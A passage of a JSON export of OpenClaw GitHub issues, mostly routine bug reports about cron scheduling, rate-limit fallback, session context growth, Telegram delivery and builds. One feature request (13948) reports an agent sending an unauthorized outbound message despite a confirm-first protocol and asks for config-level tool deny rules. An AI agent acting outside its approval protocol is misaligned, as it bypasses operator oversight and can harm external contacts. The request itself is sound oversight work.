      "body": "## Summary\n\nCron jobs stop executing entirely after multiple rapid gateway restarts. The `nextRunAtMs` values in the scheduler state jump forward by several days, causing all jobs to be skipped until the jump catches up.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9 (also reproduced on 2026.2.3-1 and 2026.2.6-3)\n- **OS:** macOS 26.2 (arm64)\n- **Node:** v22.22.0\n- **Install method:** npm/pnpm global\n- **Gateway:** LaunchAgent service\n\n## Steps to Reproduce\n\n1. Have multiple cron jobs configured (22 in our case)\n2. Perform rapid gateway restarts in sequence (e.g., multiple `config.apply` calls within minutes — we were adding a new agent config)\n3. Observe that cron jobs stop firing\n\n## Expected Behavior\n\nCron jobs continue to fire on schedule after gateway restarts. The scheduler should recalculate `nextRunAtMs` correctly on startup.\n\n## Actual Behavior\n\nAfter rapid restarts on Feb 7, ALL cron jobs stopped firing. Examining the state:\n\n- `lastRunAtMs` for all jobs frozen at Feb 5-6 values\n- `nextRunAtMs` jumped forward to Feb 11 (skipping Feb 7-10 entirely)\n- `openclaw cron status` shows `enabled: true` and reports a future `nextWakeAtMs`, but the scheduler never actually wakes to execute jobs\n- Updating OpenClaw (2026.2.3-1 → 2026.2.6-3 → 2026.2.9) did not fix the corrupted state\n- Gateway restart does not fix the corrupted state\n- The scheduler appears to be alive but the wake timer is not triggering\n\n## Scheduler State Example\n\n```\nJob                              | Last Ran       | Next Run\n---------------------------------+----------------+---------\nDaily Morning Briefing           | 02/06 06:30 AM | 02/11 06:30 AM\nAuto-Archive Emails (every 3hr)  | 02/06 06:00 PM | 02/11 03:00 AM\nWorkspace Backup                 | 02/05 11:00 PM | 02/11 11:00 PM\n```\n\nAll jobs show a 4-5 day gap between last run and next scheduled run.\n\n## Workaround\n\nNone found so far. Manual `cron run --jobId <id>` works, but the automatic scheduler remains broken. Gateway restarts and OpenClaw updates do not reset the corrupted state.\n\n## Additional Context\n\n- 22 cron jobs configured (mix of `cron`, `at`, and `every` schedule types)\n- The corruption occurred during rapid config changes adding a new agent (trustee) — approximately 3-4 restarts within a few minutes\n- The `jobs.json` file at `~/.openclaw/cron/jobs.json` retains the corrupted `nextRunAtMs` values across restarts\n- A possible fix would be to recalculate `nextRunAtMs` from the cron expression on startup rather than trusting persisted state",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13954",
      "createdAt": "2026-02-11T08:07:36Z",
      "updatedAt": "2026-02-11T08:07:36Z",
      "author": "joshuaangulo",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13948,
      "title": "Feature Request: Action-Level Tool Deny",
      "body": "Feature Request: Action-Level Tool Deny\n\nProblem\n\ntools.deny: [\"message\"] blocks the entire message tool — sends, reads, reacts, search, member-info — all or nothing. There's no way to deny message with action=send while keeping action=read available.\n\nThis makes it impossible to build a safety architecture where an agent can read channels but requires approval workflows (e.g., Lobster) for outbound sends.\n\nReal-World Scenario\n\nOur agent sent an unauthorized message to an external contact despite documented protocol requiring draft-then-confirm. We attempted to enforce this technically by denying the message tool and routing sends through Lobster workflows using clawd.invoke. However, clawd.invoke respects tools.deny, so denying message also breaks Lobster's ability to send.\n\nThe result: we can enforce email send restrictions via exec wrappers on gog/himalaya, but chat sends (Slack, iMessage) have no config-level enforcement — only protocol compliance.\n\nProposed Solution\n\nSupport action-level deny syntax:\n\n```json\n\"tools\": {\n  \"deny\": [\"message:send\"],\n  \"allow\": [\"message:read\", \"message:react\", \"message:search\", \"message:member-info\"]\n}\n```\n\nAlternatively, a denyActions map:\n\n```json\n\"tools\": {\n  \"denyActions\": {\n    \"message\": [\"send\"]\n  }\n}\n```\n\nEither approach would let clawd.invoke bypass the action-level deny (since Lobster workflows are the approved send path), or Lobster could invoke sends through a separate privileged channel.\n\nImpact: This is the difference between protocol-enforced safety (\"agent knows not to\") and config-enforced safety (\"agent physically cannot\"). Any operator running an agent with communication tools faces this exact gap.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13948",
      "createdAt": "2026-02-11T07:59:28Z",
      "updatedAt": "2026-02-11T07:59:28Z",
      "author": "iranitehrani",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack",
          "imessage"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13947,
      "title": "[Bug]: Cron scheduler cannot detect missed executions",
      "body": "## Summary\nCron scheduler has a fundamental design flaw where it cannot detect missed executions, has no execution history tracking, and returns \"not-due\" for manual triggers even when jobs have never run.\n\n## What went wrong?\n- `cron:runs` returns empty array for all jobs despite 8 being configured\n- Manual `cron:run <jobId>` returns `{\"ran\": false, \"reason\": \"not-due\"}` for jobs that have never executed\n- Scheduler only checks \"is next run in the future?\" without tracking \"when did it last run?\"\n- No catch-up mechanism for missed executions\n\n## Steps to reproduce\n1. Create a cron job: `cron:add` with daily schedule\n2. Wait 5 days without any executions\n3. Query run history: `cron:runs <jobId>` → returns `[]`\n4. Attempt manual trigger: `cron:run <jobId>` → returns `{\"ok\": true, \"ran\": false, \"reason\": \"not-due\"}`\n5. Check scheduler status: `cron:status` → shows `enabled: true`\n\n## Expected behavior\n- `cron:runs` should show execution history\n- `cron:run` should have `--force` option for overdue jobs\n- Scheduler should detect and catch up on missed runs\n- Jobs should execute according to schedule\n\n## Actual behavior\n- 8 cron jobs created Feb 6, zero executions by Feb 11\n- All run history queries return empty\n- Manual triggers rejected with \"not-due\"\n- No way to force execution or recover from scheduling gaps\n\n## Environment\n- OpenClaw version: 2026.2.3 (e75e2b1)\n- OS: Ubuntu 22.04 (Linux 6.8.0-94-generic)\n- Install method: pnpm/npm\n\n## Logs\nCron job state shows only `nextRunAtMs` with no `lastRunAtMs`:\n\n```json\n{\n  \"id\": \"ff7809e6-dfa7-4c74-b4e5-4c940c8fa4d4\",\n  \"enabled\": true,\n  \"schedule\": {\"kind\": \"cron\", \"expr\": \"55 23 * * *\", \"tz\": \"America/Los_Angeles\"},\n  \"state\": {\"nextRunAtMs\": 1770796500000}\n}\ncron:runs returns: {\"runs\": []}\n\ncron:run returns: {\"ok\": true, \"ran\": false, \"reason\": \"not-due\"}\n\nProposed fix\nAdd execution history tracking and catch-up logic:\n\ninterface CronJobState {\n  lastRunAtMs: number;      // Track last execution\n  missedRuns: number;       // Detect missed executions\n  consecutiveFailures: number;\n  // ... existing fields\n}\nAdd force parameter to cron:run for manual override of \"not-due\" jobs.\n```",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13947",
      "createdAt": "2026-02-11T07:58:14Z",
      "updatedAt": "2026-02-11T07:58:14Z",
      "author": "zhaim",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13935,
      "title": "[Bug]: Intermittent \"API provider billing error\" shown to user — swallows actual response",
      "body": "### Description\n\nIntermittent error message surfaces in Telegram chat that reads:\n\n> ⚠️ API provider returned a billing error — your API key has run out of credits or has an insufficient balance. Check your provider's billing dashboard and top up or switch to a different API key.\n\nThe error is misleading — no API billing limits have actually been reached. More critically, when this error appears, the agent's actual response is sometimes **not delivered**, requiring the user to re-send their message to get a reply.\n\n### Environment\n- **OpenClaw version:** 2026.2.9 (33c75cb)\n- **Channel:** Telegram\n- **Auth:** Claude Max 20x (OAuth token)\n- **Other APIs:** Grok (xAI) for web search, Gemini for memory embeddings\n- **Context at time of error:** 100% (200k/200k)\n\n### Reproduction\n- Occurs intermittently during active conversation\n- No specific trigger identified — happens on normal text responses (no tool calls)\n- Not correlated with web_search, memory_search, or any specific tool\n- More frequent during long/heavy sessions near context limit\n\n### What we've ruled out\n- **Anthropic weekly allowance** — confirmed ~90% remaining\n- **Grok/xAI credits** — confirmed $23+ balance remaining\n- **Gemini API** — billed through Google Workspace, no limits hit\n\n### Key issues\n1. **Error message is misleading** — says \"billing\" but no billing limit is actually reached\n2. **Swallows the agent's response** — user sees error instead of the actual reply, has to re-ping\n3. **Not logged anywhere** — checked `journalctl -u openclaw`, session transcripts, and `~/.openclaw/logs/` — no trace of the error\n4. **Intermittent** — not every message, making it hard to diagnose\n\n### Expected behavior\n- If a transient API error occurs, retry before surfacing to user\n- If surfaced, don't swallow the actual response\n- Log the underlying error (HTTP status code, provider, endpoint) for diagnosis\n\n### Suspected cause\nPossibly transient Anthropic rate limiting (per-minute, not weekly allowance) being caught and displayed as a billing error. May be related to high context usage (100%) triggering compaction-related API calls.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13935",
      "createdAt": "2026-02-11T07:27:23Z",
      "updatedAt": "2026-02-11T07:48:38Z",
      "author": "jm-fhc",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882862167,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13935#issuecomment-3882862167",
          "createdAt": "2026-02-11T07:48:38Z",
          "updatedAt": "2026-02-11T07:48:38Z",
          "author": "0xRaini",
          "body": "This is likely the same root cause as #13822 — the `/\\b402\\b/` regex in `ERROR_PATTERNS.billing` is too broad and matches non-billing text in agent responses.\n\nWe have a fix in PR #13827 that narrows the regex to only match actual HTTP 402 error contexts:\n```js\n/(?:status|code|http|error)\\s*[:=]?\\s*402\\b|^\\s*402\\s+payment/i\n```\n\nThe `contextWindow: 100%` detail in your report is interesting though — near context limit, compaction errors or truncation artifacts could also trigger false pattern matches. Worth checking if the false positive correlates with compaction events.\n\nPR #13827 should address the most common case. If it persists after that fix, we may need to tighten the other patterns in `ERROR_PATTERNS` as well."
        }
      ]
    },
    {
      "number": 13893,
      "title": "[Bug] Model fallback not triggered during rate limit cooldown",
      "body": "## Bug Description                                                                                                                                                                                      \n                                                                                                                                                                                                           \n   Model fallback does not automatically trigger when primary model (Claude Sonnet 4-5) hits rate limit and enters cooldown period.                                                                        \n                                                                                                                                                                                                           \n   ## Expected Behavior                                                                                                                                                                                    \n   When Anthropic Claude Sonnet 4-5 triggers HTTP 429 rate_limit_error, the system should automatically fallback to the configured fallback model (MiniMax M2.1), and if that also hits rate limit, then   \n fallback to the second fallback model (DeepSeek).                                                                                                                                                         \n                                                                                                                                                                                                           \n   ## Actual Behavior                                                                                                                                                                                      \n   1. Primary model (Sonnet 4-5) triggers HTTP 429 rate_limit_error multiple times                                                                                                                         \n   2. Anthropic enters a 21-minute cooldown period                                                                                                                                                         \n   3. Fallback does NOT trigger automatically                                                                                                                                                              \n   4. User has to manually switch to fallback model via session_status override                                                                                                                            \n                                                                                                                                                                                                           \n   ## Configuration                                                                                                                                                                                        \n   ```json                                                                                                                                                                                                 \n   {                                                                                                                                                                                                       \n     \"defaults\": {                                                                                                                                                                                         \n       \"model\": {                                                                                                                                                                                          \n         \"primary\": \"anthropic/claude-sonnet-4-5\",                                                                                                                                                         \n         \"fallbacks\": [                                                                                                                                                                                    \n           \"minimax-portal/MiniMax-M2.1\",                                                                                                                                                                  \n           \"deepseek/deepseek-chat\"                                                                                                                                                                        \n         ]                                                                                                                                                                                                 \n       }                                                                                                                                                                                                   \n     }                                                                                                                                                                                                     \n   }                                                                                                                                                                                                       \n ```                                                                                                                                                                                                       \n                                                                                                                                                                                                           \n Environment                                                                                                                                                                                               \n                                                                                                                                                                                                           \n - OpenClaw version: 2026.2.9 (33c75cb)                                                                                                                                                                    \n - Platform: macOS (arm64)                                                                                                                                                                                 \n - Node: v25.6.0                                                                                                                                                                                           \n - Gateway mode: local                                                                                                                                                                                     \n                                                                                                                                                                                                           \n Error Messages                                                                                                                                                                                            \n                                                                                                                                                                                                           \n ```                                                                                                                                                                                                       \n   HTTP 429 rate_limit_error: This request would exceed your account's rate limit. Please try again later. (request_id: req_011CY1hoZbafrvGRaqDsdUyP)                                                      \n   HTTP 429 rate_limit_error: This request would exceed your account's rate limit. Please try again later. (request_id: req_011CY1hp4j2nxoGo6J2WhZru)                                                      \n   HTTP 429 rate_limit_error: This request would exceed your account's rate limit. Please try again later. (request_id: req_011CY1hpqekkFZcf4AwvPSKC)                                                      \n   HTTP 429 rate_limit_error: This request would exceed your account's rate limit. Please try again later. (request_id: req_011CY1hqsBojbgSYPBYdaUzZ)                                                      \n ```                                                                                                                                                                                                       \n                                                                                                                                                                                                           \n Doctor Output                                                                                                                                                                                             \n                                                                                                                                                                                                           \n ```                                                                                                                                                                                                       \n   Auth profile cooldowns ────────────────────────────────────────────╮                                                                                                                                    \n   │  - anthropic:default: cooldown (21m) — Wait for cooldown or switch  │                                                                                                                                 \n   │    provider.                                                                                                                                                                                          \n ```                                                                                                                                                                                                       \n                                                                                                                                                                                                           \n Additional Notes                                                                                                                                                                                          \n                                                                                                                                                                                                           \n - Fallback models are properly configured and work when manually switched                                                                                                                                 \n - The issue appears to be that fallback logic does not engage during cooldown periods                                                                                                                     \n - Suggestion: Allow fallback to trigger during cooldown instead of waiting for cooldown to expire                                                                                                         \n                                                                                                                                                                                                           \n Severity                                                                                                                                                                                                  \n                                                                                                                                                                                                           \n Medium - Users have to manually intervene when rate limits are hit, breaking the intended automatic fallback behavior.      ",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13893",
      "createdAt": "2026-02-11T05:17:13Z",
      "updatedAt": "2026-02-11T07:48:07Z",
      "author": "zoutaihua1975-dot",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882385317,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13893#issuecomment-3882385317",
          "createdAt": "2026-02-11T05:58:32Z",
          "updatedAt": "2026-02-11T05:58:32Z",
          "author": "0xRaini",
          "body": "This is likely happening because the rate limit error is caught and retried internally (with backoff) rather than being escalated to the fallback logic.\n\n**Root cause hypothesis:** The retry/fallback decision tree probably checks for specific error types. HTTP 429 with `rate_limit_error` may be classified as \"retryable\" (which it is, eventually), but during a 21-minute cooldown, retrying the same provider is wasteful. The fallback should kick in when:\n\n1. Rate limit retry count exceeds a threshold (e.g., 3 retries)\n2. OR the `retry-after` header indicates a wait > some threshold (e.g., 60s)\n\n**Suggested fix:**\n\n```ts\n// In the retry/error handler:\nif (isRateLimitError(error)) {\n  const retryAfterSec = parseRetryAfter(error);\n  const retryCount = context.rateLimitRetries++;\n  \n  if (retryCount >= MAX_RATE_LIMIT_RETRIES || retryAfterSec > FALLBACK_THRESHOLD_SEC) {\n    // Escalate to fallback model instead of waiting\n    return attemptFallbackModel(context, error);\n  }\n  // Otherwise, short retry with backoff\n  await sleep(retryAfterSec * 1000);\n}\n```\n\nThe key insight: a 21-minute cooldown should immediately trigger fallback, not make the user wait. The retry loop should have a \"patience threshold\" before escalating.\n\nHappy to take this on if you'd like a PR!"
        },
        {
          "id": 3882860501,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13893#issuecomment-3882860501",
          "createdAt": "2026-02-11T07:48:07Z",
          "updatedAt": "2026-02-11T07:48:07Z",
          "author": "0xRaini",
          "body": "**Update: deeper analysis with code references**\n\nTraced through the full fallback chain. The 429 → FailoverError path works correctly:\n- `failover-error.ts:resolveFailoverReasonFromError()` catches `status === 429` → returns `\"rate_limit\"`\n- `coerceToFailoverError()` wraps it → fallback loop continues to next candidate\n\n**The actual bug is in candidate list construction + cooldown interaction:**\n\nIn `model-fallback.ts:250-260`, when all profiles for a provider are in cooldown, the candidate is skipped. But if the fallback candidates are all from the **same provider** (common when `fallbacks` aren't explicitly configured — the system adds `config.agents.defaults.model` as final fallback, which is often the same provider), then:\n\n1. Primary model (e.g. `anthropic/sonnet-4-5`) hits rate limit → `markAuthProfileFailure` sets cooldown\n2. Fallback candidate is also anthropic → same provider cooldown → **skipped**\n3. All candidates exhausted → `\"All models failed\"` error\n\n**Two fixes needed:**\n\n1. **`resolveFallbackCandidates()`** should deduplicate and prefer cross-provider fallbacks. If the only fallback is the same provider as primary, it's not a real fallback during rate limiting.\n\n2. **When all candidates are skipped due to cooldown**, the error message should explicitly say `\"all fallback models are rate-limited\"` rather than the generic failure, so users know to configure a cross-provider fallback.\n\n```ts\n// In resolveFallbackCandidates, after building the list:\nif (candidates.every(c => c.provider === candidates[0].provider)) {\n  log.warn('All fallback candidates are from the same provider — '\n    + 'rate limit on one will block all. Consider adding a cross-provider fallback.');\n}\n```\n\nHappy to submit a PR for this — it's a targeted fix in `model-fallback.ts`."
        }
      ]
    },
    {
      "number": 13938,
      "title": "[Bug]: Session context accumulates infinitely until API limits are exceeded",
      "body": "## Summary\nOpenClaw sessions store unlimited conversation history in `sessions.json`, eventually causing HTTP 400 errors when the total context (conversation + max_tokens) exceeds the model's limit. The system fails silently with no recovery options.\n\n## Environment\n- **OpenClaw version:** 2026.2.9\n- **Model:** anthropic/claude-sonnet-4-20250514\n- **Context limit:** 200,000 tokens\n- **Platform:** macOS (Darwin 25.2.0 arm64)\n\n## Steps to Reproduce\n1. Use OpenClaw agent in main session over several days\n2. Have extended conversations (especially technical/long responses)\n3. Eventually hit: `HTTP 400 invalid_request_error: input length and max_tokens exceed context limit: 172818 + 34048 > 200000`\n\n## Current Behavior ❌\n- Sessions accumulate infinite message history\n- No automatic context management\n- Silent failure when limits hit\n- Requires manual intervention: `rm ~/.openclaw/agents/main/sessions/sessions.json`\n- System becomes unresponsive until manual reset\n\n## Expected Behavior ✅\n- Automatic context window management (sliding window, summarization)\n- Graceful degradation with user warnings before hitting limits\n- Recovery options (\"Context full, trim now?\")\n- Clear error messages when issues occur\n\n## Workaround\n```bash\n# Backup session\ncp ~/.openclaw/agents/main/sessions/sessions.json ~/.openclaw/agents/main/sessions/sessions.json.backup\n\n# Reset session\nrm ~/.openclaw/agents/main/sessions/sessions.json\nopenclaw gateway restart\n```\n\n## Suggested Solutions\n1. **Sliding window:** Keep recent N messages, summarize older context\n2. **Smart truncation:** Remove middle messages while preserving start/end context\n3. **Context monitoring:** Warn users at 80% capacity\n4. **Auto-compression:** Summarize old conversations into system messages\n\n## Impact\n- **Frequency:** Every 2-3 days of normal usage\n- **Severity:** Complete system failure requiring manual intervention\n- **User Experience:** Confusing silent failures\n\nThis is a fundamental UX issue affecting daily OpenClaw usage.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13938",
      "createdAt": "2026-02-11T07:29:37Z",
      "updatedAt": "2026-02-11T07:47:15Z",
      "author": "likhit6430347321",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882855943,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13938#issuecomment-3882855943",
          "createdAt": "2026-02-11T07:46:42Z",
          "updatedAt": "2026-02-11T07:47:15Z",
          "author": "engagepy",
          "body": "Facing the same, this needs an auto truncation / backup cron. \n\nWith UI getting a suggestive progress bar, that informs user of upcoming context limit. A manual reset for non-terminal/dev users to achieve the same from web_ui. \n\nContext limit can be inferred basis model selection, by creating a list of popular models : max_context_length"
        }
      ]
    },
    {
      "number": 13944,
      "title": "[Bug]: Telegram DM - intermediate assistant text between tool calls sent as separate messages + message ordering",
      "body": "## Summary\n\nTwo issues in Telegram DM (non-threaded, `streamMode: \"off\"`, `blockStreamingDefault` not set / off):\n\n### 1. Intermediate assistant text leaks as separate messages\n\nWhen the agent (Claude) outputs text between tool_use blocks (e.g., \"Let me check...\"), those intermediate text segments are delivered to Telegram as separate messages instead of being suppressed or concatenated into the final reply.\n\nExample: Agent performs a multi-step operation (browser nav → memory search → final answer). Each intermediate narration line arrives as its own Telegram message:\n- \"Let me check the situation from memory\"\n- \"Let me first check the old profile\"\n- [final actual answer]\n\nExpected: Only the final reply text should be sent to Telegram when block streaming is off.\n\n### 2. Message ordering\n\nWhen multiple messages are sent in quick succession (e.g., the intermediate texts + final reply), they sometimes appear out of chronological order in Telegram.\n\n## Steps to reproduce\n\n1. Configure Telegram channel with `streamMode: \"off\"`, no block streaming\n2. Send a message that triggers multi-step tool use (browser + memory operations)\n3. Agent outputs narration text between tool calls\n4. Each text segment arrives as separate Telegram message\n5. Messages may appear out of order\n\n## Expected behavior\n\n- Only the final reply text is sent to Telegram\n- If multiple messages must be sent, they arrive in correct order\n\n## Environment\n\n- OpenClaw: 2026.2.6-3 (npm)\n- OS: macOS arm64 Darwin 25.2.0\n- Channel: Telegram (long-polling, DM, non-threaded)\n- Model: claude-opus-4-6\n- Config: `streamMode: \"off\"`, no blockStreaming settings",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13944",
      "createdAt": "2026-02-11T07:44:12Z",
      "updatedAt": "2026-02-11T07:44:12Z",
      "author": "JimmyClanker",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 8269,
      "title": "Webchat: Images disappear after paste/send",
      "body": "## Summary\nWhen pasting an image into the webchat interface, the image appears to send successfully but then disappears from the chat display. The user cannot see the image they sent.\n\n## Steps to Reproduce\n1. Open OpenClaw webchat (http://127.0.0.1:18789/)\n2. Copy an image to clipboard (from browser, Finder, etc.)\n3. Paste into chat input (Cmd+V)\n4. Image sends (appears briefly or sends without preview)\n5. Image disappears from chat — not visible in message history\n\n## Expected Behavior\nPasted images should:\n- Show a preview before sending\n- Remain visible in the chat after sending\n- Be viewable by both user and agent\n\n## Actual Behavior\n- Image sends (agent may receive it)\n- Image vanishes from webchat UI\n- No error message shown\n\n## Additional Context\n- Drag-and-drop also problematic (opens image instead of dropping)\n- Copy/paste has same issue\n\n## Environment\n- OpenClaw: 2026.2.1\n- OS: macOS 26.1 (arm64)\n- Node: 24.9.0\n- Gateway: local loopback (ws://127.0.0.1:18789)\n- Browser: Safari/Chrome (macOS)",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/8269",
      "createdAt": "2026-02-03T20:41:14Z",
      "updatedAt": "2026-02-11T07:41:58Z",
      "author": "hlmayoral-web",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3867282290,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8269#issuecomment-3867282290",
          "createdAt": "2026-02-08T14:17:22Z",
          "updatedAt": "2026-02-08T14:17:22Z",
          "author": "Foxtr0t1337",
          "body": "Same issue. \nAgent receives the image correctly.\nThe image data is in session file, just need to load it properly in webchat."
        },
        {
          "id": 3882840684,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8269#issuecomment-3882840684",
          "createdAt": "2026-02-11T07:41:57Z",
          "updatedAt": "2026-02-11T07:41:57Z",
          "author": "xuwei999",
          "body": "Same issue+1"
        }
      ]
    },
    {
      "number": 5661,
      "title": "[Bug]: problems building Dockerfile on ZFS",
      "body": "## Summary\n\nWhat went wrong?\n\n## Steps to reproduce\n\n1. `git clone https://github.com/moltbot/moltbot.git`\n2. `cd moltbot`\n3. `sudo ./docker-setup.sh`\n\n## Expected behavior\n\nWhat did you expect to happen?\n\n## Actual behavior\n\n` ERR_PNPM_EAGAIN  EAGAIN: resource temporarily unavailable, copyfile '/root/.local/share/pnpm/store/v10/files/d3/0b752e90cb356151b63355cac20ba575afb579ac2ab3c251a3d6609f124f3f340116af096307860eb1e2e3371c5af266bd0c1e4f014bb57fef2f7d47ab1ce8' -> '/app/node_modules/.pnpm/@types+trusted-types@2.0.7/node_modules/@types/trusted-types_tmp_7/README.md'`\n\n## Environment\n\n- Clawdbot version: `v2026.1.10-3555-g34e2425b4`\n- OS: Linux Arch\n- Install method (pnpm/npx/docker/etc): docker\n\n## Fix\n\nAs suggested [here](https://github.com/hoppscotch/hoppscotch/issues/4960#issuecomment-2780903150) it can be solved by the following patch:\n\n```patch\n--- Dockerfile\n+++ Dockerfile\n@@ -21,7 +21,7 @@ COPY ui/package.json ./ui/package.json\n COPY patches ./patches\n COPY scripts ./scripts\n\n-RUN pnpm install --frozen-lockfile\n+RUN pnpm install --frozen-lockfile --package-import-method=hardlink \n\n COPY . .\n RUN OPENCLAW_A2UI_SKIP_MISSING=1 pnpm build\n```\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5661",
      "createdAt": "2026-01-31T20:11:57Z",
      "updatedAt": "2026-02-11T07:35:00Z",
      "author": "lapo-luchini",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3875634053,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5661#issuecomment-3875634053",
          "createdAt": "2026-02-10T06:34:38Z",
          "updatedAt": "2026-02-10T06:34:38Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3882818834,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5661#issuecomment-3882818834",
          "createdAt": "2026-02-11T07:35:00Z",
          "updatedAt": "2026-02-11T07:35:00Z",
          "author": "lapo-luchini",
          "body": "Still valid."
        }
      ]
    },
    {
      "number": 13930,
      "title": "memory status triggers QMD boot update/embed and can hang (side effects in status command)",
      "body": "### Bug: `openclaw memory status` triggers QMD boot update/embed and can hang (side effects in a status command)\n\n**OpenClaw version:** 2026.2.9 (npm install, not a git checkout)\n\n#### What I expected\n`openclaw memory status --json` should be a fast, read-only check.\n\n#### What happened\nOn a machine using the QMD backend, `openclaw memory status` would intermittently **hang** and in automation contexts get SIGKILL’d.\n\nThe hang correlated with the command spawning a long-running QMD embed job (`bun … qmd.ts embed`) via the local embed server, and then never returning.\n\n#### Root cause (code-level)\n`runMemoryStatus()` calls `getMemorySearchManager()`.\n\nWhen QMD backend is selected, `getMemorySearchManager()` calls `QmdMemoryManager.create()`.\n\n`QmdMemoryManager.create()` unconditionally calls `await manager.initialize()`.\n\nIn `QmdMemoryManager.initialize()`:\n```js\nif (this.qmd.update.onBoot) {\n  const bootRun = this.runUpdate(\"boot\", true);\n  ...\n}\n```\nSo *any* construction of the QMD memory manager (including for a CLI status read) triggers a **boot update** side-effect. That update can include heavy `qmd embed` work.\n\nThis makes `openclaw memory status` non-read-only and able to block on background embed/update behavior.\n\n#### Evidence (runtime)\nWhen the hang happened, there was a child process:\n- `<HOME>/.bun/bin/bun …/qmd.ts embed`\n- active TCP connection to embed server: `127.0.0.1:<ephemeral> -> 127.0.0.1:8099`\n\nKilling the parent `openclaw memory status` killed the embed child.\n\n#### Mitigation (works)\nSetting:\n- `memory.qmd.update.onBoot = false`\n\nimmediately made `openclaw memory status --json --verbose` return cleanly.\n\n#### Suggested fix (foundational)\nMake QMD manager initialization for **status-only calls** not trigger boot update/embed.\n\nOptions:\n1) Add a flag/path so `getMemorySearchManager()` can request a QMD manager with `initialize({ skipBootUpdate: true })` (or similar) when called from `runMemoryStatus()`.\n2) Make `QmdMemoryManager.create()` accept options to skip side effects, and default to current behavior for gateway startup, but not for ad-hoc CLI status.\n3) Alternatively: in `runMemoryStatus`, if `opts.deep/opts.index` are false, avoid creating a fully-initialized manager that can trigger updates.\n\nThis keeps the semantics clean: **status should not trigger indexing/embedding work**.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13930",
      "createdAt": "2026-02-11T07:17:56Z",
      "updatedAt": "2026-02-11T07:34:03Z",
      "author": "goldtetsola",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13912,
      "title": "[Bug]: Slack thread history and pending history overlap on new session start",
      "body": "## Summary\n\nWhen a new thread session starts in a Slack channel, **Thread history** (fetched from the Slack API via `resolveSlackThreadHistory()`) and **InboundHistory** (accumulated pending messages from `channelHistories`) are both injected into the user message with no deduplication. Messages that exist in both sources appear twice in the LLM context, wasting tokens.\n\n## Steps to reproduce\n\n1. Configure a Slack channel with `threadHistoryScope: \"thread\"` (default)\n2. In a thread, send messages **without** mentioning the bot (these accumulate as pending history)\n3. Then mention the bot in the same thread (triggering a new session)\n4. Inspect the session JSONL — the first user message contains both `[Thread history - for context]` and `Chat history since last reply (untrusted, for context):` with overlapping messages\n\n## Expected behavior\n\nEach message should appear only once in the LLM context. When thread history is fetched from the Slack API, it already includes the messages that were accumulated as pending history, so the pending history should be suppressed or deduplicated.\n\n## Actual behavior\n\nBoth context blocks are injected into the same user message:\n\n```\n[Thread history - for context]\n[Slack User (user) ...] message A\n[Slack User (user) ...] message B\n[Slack User (user) ...] message C  ← trigger message\n\nChat history since last reply (untrusted, for context):\n[{\"sender\":\"User\",\"body\":\"message A\"}, {\"sender\":\"User\",\"body\":\"message B\"}]\n```\n\nMessages A and B appear in both blocks.\n\n## Root cause\n\nIn `src/auto-reply/reply/get-reply-run.ts`, two independent injection paths operate without awareness of each other:\n\n1. **Lines ~209-214**: `buildInboundUserContextPrefix()` injects `InboundHistory` (from `channelHistories` map)\n2. **Lines ~245-265**: `threadContextNote` injects `ThreadHistoryBody` (from Slack API via 